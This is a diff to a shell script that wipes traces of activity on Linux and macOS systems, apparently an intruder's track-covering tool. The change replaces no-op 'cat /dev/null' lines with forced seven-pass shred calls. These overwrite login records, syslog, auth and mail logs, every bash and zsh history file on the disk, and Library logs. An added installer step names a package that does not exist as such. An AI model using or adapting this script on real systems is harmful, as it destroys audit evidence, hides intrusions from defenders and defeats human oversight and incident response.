@@ -1,5 +1,7 @@
 #!/bin/sh
 
+SHRED_ARGS="-n 7 -z --force"
+
 banner() {
     printf '\033[0;31m
          ████               ████
@@ -39,36 +41,52 @@ banner() {
 '
 }
 
+shred_check() {
+    if ! command -v shred &> /dev/null; then
+        echo "[-] The 'shred' command was not found. Installing..."
+        sudo apt-get update
+        sudo apt-get install shred -y
+        if [ $? -eq 0 ]; then
+            echo "[+] The 'shred' command was installed successfully."
+        else
+            echo "[-] Error installing 'shred' command. Please check permissions or internet connection."
+            exit 1
+        fi
+    else
+        echo "[+] The 'shred' command is already installed."
+    fi
+}
+
 remove_login() {
-    cat /dev/null /var/log/wtmp 2>/dev/null
-    cat /dev/null /var/log/btmp 2>/dev/null
-    cat /dev/null /var/log/lastlog 2>/dev/null
+    shred $SHRED_ARGS /var/log/wtmp 2>/dev/null
+    shred $SHRED_ARGS /var/log/btmp 2>/dev/null
+    shred $SHRED_ARGS /var/log/lastlog 2>/dev/null
 }
 
 other_logs() {
-    cat /dev/null /var/log/messages 2>/dev/null
-    cat /dev/null /var/log/maillog 2>/dev/null
-    cat /dev/null /var/log/secure 2>/dev/null
-    cat /dev/null /var/log/syslog 2>/dev/null
-    cat /dev/null /var/log/dmesg 2>/dev/null
+    shred $SHRED_ARGS /var/log/messages 2>/dev/null
+    shred $SHRED_ARGS /var/log/maillog 2>/dev/null
+    shred $SHRED_ARGS /var/log/secure 2>/dev/null
+    shred $SHRED_ARGS /var/log/syslog 2>/dev/null
+    shred $SHRED_ARGS /var/log/dmesg 2>/dev/null
 
     for mail_f in $(find /var/log/ -name "mail\.*" 2>/dev/null)
         do
-            cat /dev/null $mail_f 2>/dev/null
+            shred $SHRED_ARGS $mail_f 2>/dev/null
     done
 }
 
 bash_history() {
     for bash_history in $(find / -name ".bash_history" 2>/dev/null)
         do
-            cat /dev/null $bash_history 2>/dev/null
+            shred $SHRED_ARGS $bash_history 2>/dev/null
     done
 }
 
 zsh_history() {
     for zsh_history in $(find / -name ".zsh_history" 2>/dev/null)
         do
-            cat /dev/null $zsh_history 2>/dev/null
+            shred $SHRED_ARGS $zsh_history 2>/dev/null
     done
 }
 
@@ -76,7 +94,7 @@ mac_root_logs() {
 
     for mac_root_logs in $(find ~/Library  -name "*.log" 2>/dev/null)
         do
-            cat /dev/null $mac_root_logs 2>/dev/null
+            shred $SHRED_ARGS $mac_root_logs 2>/dev/null
     done
 }
 
@@ -84,7 +102,7 @@ mac_normal_logs() {
     
     for mac_normal_logs in $(find /Library  -name "*.log" 2>/dev/null)
         do
-            cat /dev/null $mac_normal_logs 2>/dev/null
+            shred $SHRED_ARGS $mac_normal_logs 2>/dev/null
     done
     
 }
@@ -96,7 +114,7 @@ logs_f() {
 
     while read log_f
         do
-            cat /dev/null $log_f 2>/dev/null
+            shred $SHRED_ARGS $log_f 2>/dev/null
             printf "\n\033[0;32m[+] \033[0;37mLog deleted: $log_f"
     done < .logs
     rm -f .logs
@@ -105,6 +123,7 @@ logs_f() {
 main() {
     banner
     sleep 1
+    shred_check
     printf '\n\033[0;34m[*] \033[0;37mClearing system login logs\n'
     remove_login
     printf '\033[0;32m[+] \033[0;37mLogin logs successfully deleted!\n'
